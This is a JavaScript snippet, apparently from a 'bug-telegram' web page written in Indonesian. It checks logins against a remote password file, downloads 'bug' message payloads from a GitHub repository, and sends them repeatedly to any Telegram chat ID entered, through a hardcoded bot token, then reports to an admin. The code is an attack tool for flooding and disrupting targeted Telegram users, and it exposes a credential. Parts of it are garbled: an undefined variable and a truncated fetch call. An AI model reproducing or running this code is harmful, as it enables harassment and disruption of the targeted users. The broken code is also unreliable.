  <script>
    const PASSWORDS_URL = "https://raw.githubusercontent.com/justvinzoffc/bug-telegram/main/password.json";
    const BOT_TOKEN = "8213727800:AAGibwkPrsaMArgZmgKNtSKtZMWj1K9C4Jg"; // ğŸ” Ganti token bot kamu
    const ADMIN_ID = "6696150439";   // ğŸ” Ganti ID admin kamu

    let currentUser = "";

    async function login() {
      const user = document.getElementById("username").value.trim();
      const pass = document.getElementById("password").value.trim();
      const status = document.getElementById("loginStatus");

      if (!user || !pass) {
        status.innerText = "âš ï¸ Harap isi username & password!";

      }

      try {
        const res = await fetch(PASSWORDS_URL);

        if (json[user] && json[user] === pass) {
          currentUser = user;
          status.innerText = "âœ… Login berhasil!";
          document.getElementById("login").style.display = "none";
          document.getElementById("dashboard").style.display = "block";
        } else {
          status.innerText = "âŒ Password Tidak Ada di Database";
        }
      } catch (e) {
        status.innerText = "âŒ Password Tidak Ada di Database!!";
      }
    }

    async function kirimPesan(pesanFile) {
      const chatIdInput = document.getElementById("chatId").value.trim();
      const jumlah = parseInt(document.getElementById("jumlah").value);
      const status = document.getElementById("status");

      if (!chatIdInput || !jumlah) {
        status.innerText = "âš ï¸ Harap isi ID dan jumlah kirim!";
        return;
      }

      const urlPesan = `https://raw.githubusercontent.com/justvinzoffc/bug-telegram/main/${pesanFile}.txt`;
      let pesan;
      try {
        const res = await fetch(urlPesan);
        pesan = await res.text();
      } catch (e) {
        status.innerText = "âŒ Error Saat Kirim Bug!!";
        return;
      }

      status.innerText = "â³ Mengirim Bug...";

      let total = 0;
      for (let i = 0; i < jumlah; i++) {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatIdInput,
            text: pesan
          })
        });

        const data = await response.json();
        if (!data.ok) {
          status.innerText = `âŒ Gagal kirim: ${data.description}`;
          return;
        }

        total++;
        await new Promise(resolve => setTimeout(resolve, 500)); // jeda 500ms
      }

      status.innerText = `âœ… Sukses kirim ${total} Bug ke ${chatIdInput}`;

      // Kirim notifikasi ke ADMIN

        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          text: notif,
          parse_mode: "Markdown"
        })
      });
    }
  </script>
